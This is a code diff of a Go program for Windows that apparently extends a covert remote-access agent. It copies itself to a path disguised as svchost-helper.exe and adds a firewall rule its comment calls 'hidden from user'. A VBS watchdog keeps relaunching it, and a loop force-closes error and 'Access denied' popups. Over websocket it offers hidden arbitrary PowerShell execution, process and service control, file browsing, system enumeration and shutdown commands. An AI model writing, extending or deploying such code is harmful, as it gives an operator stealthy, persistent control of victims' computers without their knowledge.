@@ -4,15 +4,18 @@ package main
 
 import (
 	"encoding/binary"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
 	"unsafe"
 
+	"github.com/gorilla/websocket"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 )
@@ -137,8 +140,8 @@ func preventDuplicate() {
 	myPID := os.Getpid()
 	exe, _ := os.Executable()
 	exeName := filepath.Base(exe)
-	cmd := exec.Command("powershell", "-NoProfile", "-Command",
-		"Get-Process -Name '"+strings.TrimSuffix(exeName, ".exe")+"' -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne "+fmt.Sprintf("%d", myPID)+" } | Stop-Process -Force")
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference = 'SilentlyContinue'; Get-Process -Name '"+strings.TrimSuffix(exeName, ".exe")+"' -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne "+fmt.Sprintf("%d", myPID)+" } | Stop-Process -Force")
 	hideCmd(cmd)
 	_ = cmd.Run()
 	lockFile := filepath.Join(dataDir(), "agent.lock")
@@ -148,17 +151,29 @@ func preventDuplicate() {
 func setupAutostart() {
 	exe, _ := os.Executable()
 	exeName := filepath.Base(exe)
+	exeDir := filepath.Dir(exe)
 
 	// 1. Create firewall rule to allow outbound connections (hidden from user)
 	createFirewallRule(exeName)
 
 	// 2. Copy to ProgramData with system-like name for persistence
 	persistPath := filepath.Join("C:\\ProgramData", "Microsoft", "Windows", "SystemHelper", "svchost-helper.exe")
-	os.MkdirAll(filepath.Dir(persistPath), 0755)
+	persistDir := filepath.Dir(persistPath)
+	os.MkdirAll(persistDir, 0755)
 	if exe != persistPath {
 		src, err := os.ReadFile(exe)
 		if err == nil {
 			os.WriteFile(persistPath, src, 0644)
+		}
+		// Also copy config.ini if it exists next to the exe
+		srcCfg := filepath.Join(exeDir, "config.ini")
+		if cfgData, err := os.ReadFile(srcCfg); err == nil {
+			os.WriteFile(filepath.Join(persistDir, "config.ini"), cfgData, 0644)
+		}
+		// Also copy to %APPDATA%\SystemHelper\ for the agent data dir
+		appDataCfg := filepath.Join(dataDir(), "config.ini")
+		if cfgData, err := os.ReadFile(srcCfg); err == nil {
+			os.WriteFile(appDataCfg, cfgData, 0644)
 		}
 	}
 
@@ -214,20 +229,25 @@ func createStealthWatchdog(persistPath, originalExe string) {
 	// Create dual watchdog: VBS watches for exe, exe watches for VBS
 	watchdogPath := filepath.Join(dataDir(), "watchdog.vbs")
 	
-	// Watchdog monitors BOTH the original exe and the persisted copy
-	watchdog := `Set sh = CreateObject("WScript.Shell")
+	// Watchdog monitor BOTH the original exe and the persisted copy
+	// On Error Resume Next suppresses ALL popup errors
+	watchdog := `On Error Resume Next
+Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Do
+  On Error Resume Next
   Set svc = GetObject("winmgmts:\\.\root\cimv2")
-  Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemHelper.exe' OR Name='svchost-helper.exe'")
-  If procs.Count = 0 Then
-    ' Try persisted copy first, then original
-    If fso.FileExists("` + persistPath + `") Then
-      sh.Run "` + persistPath + `", 0, False
-    ElseIf fso.FileExists("` + originalExe + `") Then
-      sh.Run "` + originalExe + `", 0, False
+  If Err.Number = 0 Then
+    Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemHelper.exe' OR Name='svchost-helper.exe'")
+    If procs.Count = 0 Then
+      If fso.FileExists("` + persistPath + `") Then
+        sh.Run "` + persistPath + `", 0, False
+      ElseIf fso.FileExists("` + originalExe + `") Then
+        sh.Run "` + originalExe + `", 0, False
+      End If
     End If
   End If
+  Err.Clear
   WScript.Sleep 5000
 Loop`
 	os.WriteFile(watchdogPath, []byte(watchdog), 0644)
@@ -242,6 +262,19 @@ Loop`
 
 func receivedDir() string {
 	return filepath.Join("C:\\", "ProgramData", "SystemHelper", "received")
+}
+
+func startPopupKiller() {
+	// Kill any WSH/error popups that appear
+	go func() {
+		for {
+			time.Sleep(2 * time.Second)
+			cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+				"$ProgressPreference='SilentlyContinue'; Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -match 'Windows Script Host|Error|Script|Permission|Access denied' -and $_.MainWindowTitle -ne '' } | ForEach-Object { $_.CloseMainWindow() | Out-Null; Start-Sleep -Milliseconds 200; if(!$_.HasExited){ $_.Kill() | Out-Null } }")
+			hideCmd(cmd)
+			_ = cmd.Run()
+		}
+	}()
 }
 
 func startActivityLogger() {
@@ -291,30 +324,231 @@ func startActivityLogger() {
 				logEventDate("[" + dateStr + "] RUNNING | uptime " + fmt.Sprintf("%d", osUptime()) + "min | active " + fmt.Sprintf("%ds", totalActive) + " | idle " + fmt.Sprintf("%ds", totalIdle))
 			}
 			statusTick++
-			if statusTick >= 5 && wsRef != nil {
-				statusTick = 0
-				totalActive := totalActiveSeconds
-				totalIdle := totalIdleSeconds
-				if idle < 300 {
-					totalActive += int64(now.Sub(activePeriodStart).Seconds())
-				} else {
-					totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
+			if statusTick >= 5 {
+				wsRefsMu.Lock()
+				refs := make([]*websocket.Conn, len(wsRefs))
+				copy(refs, wsRefs)
+				wsRefsMu.Unlock()
+				if len(refs) > 0 {
+					statusTick = 0
+					totalActive := totalActiveSeconds
+					totalIdle := totalIdleSeconds
+					if idle < 300 {
+						totalActive += int64(now.Sub(activePeriodStart).Seconds())
+					} else {
+						totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
+					}
+					for _, c := range refs {
+						c.WriteJSON(Message{
+							Type: "agent-status",
+							Data: map[string]interface{}{
+								"bootTime":     bootTime().Format(time.RFC3339),
+								"programStart": programStartTime.Format(time.RFC3339),
+								"totalIdle":    totalIdle,
+								"totalActive":  totalActive,
+								"currentState": lastIdleState,
+								"currentIdle":  idle,
+								"uptime":       osUptime(),
+								"version":      Version,
+							},
+						})
+					}
 				}
-				wsRef.WriteJSON(Message{
-					Type: "agent-status",
-					Data: map[string]interface{}{
-						"bootTime":     bootTime().Format(time.RFC3339),
-						"programStart": programStartTime.Format(time.RFC3339),
-						"totalIdle":    totalIdle,
-						"totalActive":  totalActive,
-						"currentState": lastIdleState,
-						"currentIdle":  idle,
-						"uptime":       osUptime(),
-						"version":      Version,
-					},
-				})
 			}
 			time.Sleep(60 * time.Second)
 		}
 	}()
+}
+
+func getSystemInfo() map[string]interface{} {
+	info := make(map[string]interface{})
+	
+	// OS Version
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; $os = Get-CimInstance Win32_OperatingSystem; Write-Output ($os.Caption + ' | ' + $os.Version + ' | ' + $os.OSArchitecture)")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		info["os"] = strings.TrimSpace(string(out))
+	}
+	
+	// CPU
+	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; $cpu = Get-CimInstance Win32_Processor; Write-Output ($cpu.Name.Trim() + ' | Cores: ' + $cpu.NumberOfCores + ' | Threads: ' + $cpu.NumberOfLogicalProcessors)")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		info["cpu"] = strings.TrimSpace(string(out))
+	}
+	
+	// RAM
+	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; $os = Get-CimInstance Win32_OperatingSystem; $total = [math]::Round($os.TotalVisibleMemorySize/1MB, 1); $free = [math]::Round($os.FreePhysicalMemory/1MB, 1); $used = [math]::Round($total - $free, 1); Write-Output ('Total: ' + $total + 'GB | Used: ' + $used + 'GB | Free: ' + $free + 'GB')")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		info["ram"] = strings.TrimSpace(string(out))
+	}
+	
+	// GPU
+	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; $gpu = Get-CimInstance Win32_VideoController; Write-Output ($gpu.Name)")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		info["gpu"] = strings.TrimSpace(string(out))
+	}
+	
+	// Uptime
+	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime; $up = (Get-Date) - $boot; Write-Output ('Days: ' + $up.Days + ' | Hours: ' + $up.Hours + ' | Minutes: ' + $up.Minutes)")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		info["uptime"] = strings.TrimSpace(string(out))
+	}
+	
+	return info
+}
+
+func getProcessList() []map[string]interface{} {
+	var procs []map[string]interface{}
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; Get-Process | Select-Object Id, Name, CPU, WorkingSet64, StartTime | ConvertTo-Json -Compress")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		json.Unmarshal(out, &procs)
+	}
+	return procs
+}
+
+func killProcess(pid string) bool {
+	cmd := exec.Command("taskkill", "/F", "/PID", pid)
+	hideCmd(cmd)
+	return cmd.Run() == nil
+}
+
+func getServiceList() []map[string]interface{} {
+	var svcs []map[string]interface{}
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; Get-Service | Select-Object Name, DisplayName, Status | ConvertTo-Json -Compress")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		json.Unmarshal(out, &svcs)
+	}
+	return svcs
+}
+
+func controlService(name, action string) bool {
+	var cmd *exec.Cmd
+	switch action {
+	case "start":
+		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Start-Service -Name '"+name+"'")
+	case "stop":
+		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Stop-Service -Name '"+name+"'")
+	case "restart":
+		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Restart-Service -Name '"+name+"'")
+	default:
+		return false
+	}
+	hideCmd(cmd)
+	return cmd.Run() == nil
+}
+
+func getDriveList() []map[string]interface{} {
+	var drives []map[string]interface{}
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; Get-Volume | Where-Object { $_.DriveLetter } | Select-Object DriveLetter, FileSystemLabel, FileSystem, @{N='Size';E={[math]::Round($_.Size/1GB,1)}}, @{N='Free';E={[math]::Round($_.SizeRemaining/1GB,1)}} | ConvertTo-Json -Compress")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		json.Unmarshal(out, &drives)
+	}
+	return drives
+}
+
+func listFiles(dirPath string) []map[string]interface{} {
+	var files []map[string]interface{}
+	if dirPath == "" { dirPath = "C:\\" }
+	entries, err := os.ReadDir(dirPath)
+	if err != nil { return files }
+	for _, e := range entries {
+		info, _ := e.Info()
+		files = append(files, map[string]interface{}{
+			"name":    e.Name(),
+			"isDir":   e.IsDir(),
+			"size":    info.Size(),
+			"modTime": info.ModTime().Format("2006-01-02 15:04:05"),
+		})
+	}
+	return files
+}
+
+func getNetworkInfo() map[string]interface{} {
+	info := make(map[string]interface{})
+	
+	// Network adapters
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object Name, InterfaceDescription, @{N='Speed';E={[math]::Round($_.LinkSpeed/1000000,0)+' Mbps'}}, MacAddress, Status | ConvertTo-Json -Compress")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		var adapters []map[string]interface{}
+		json.Unmarshal(out, &adapters)
+		info["adapters"] = adapters
+	}
+	
+	// DNS
+	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; (Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses -join ', '")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		info["dns"] = strings.TrimSpace(string(out))
+	}
+	
+	return info
+}
+
+func getEventLogs(count int) []map[string]interface{} {
+	var logs []map[string]interface{}
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"$ProgressPreference='SilentlyContinue'; Get-EventLog -LogName System -Newest "+strconv.Itoa(count)+" | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json -Compress")
+	hideCmd(cmd)
+	if out, err := cmd.Output(); err == nil {
+		json.Unmarshal(out, &logs)
+	}
+	return logs
+}
+
+func executeShellCommand(cmdStr string) string {
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", cmdStr)
+	hideCmd(cmd)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return string(out) + "\nError: " + err.Error()
+	}
+	return string(out)
+}
+
+func lockWorkstation() {
+	procLock := user32.NewProc("LockWorkStation")
+	procLock.Call()
+}
+
+func logoffUser() {
+	cmd := exec.Command("shutdown", "/l")
+	hideCmd(cmd)
+	_ = cmd.Start()
+}
+
+func shutdownPC() {
+	cmd := exec.Command("shutdown", "/s", "/t", "0")
+	hideCmd(cmd)
+	_ = cmd.Start()
+}
+
+func restartPC() {
+	cmd := exec.Command("shutdown", "/r", "/t", "0")
+	hideCmd(cmd)
+	_ = cmd.Start()
+}
+
+func sleepPC() {
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"(Add-Type '[DllImport(\"powrprof.dll\")]public static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);' -Name 'Win32' -PassThru)::SetSuspendState($false, $false, $false)")
+	hideCmd(cmd)
+	_ = cmd.Run()
 }
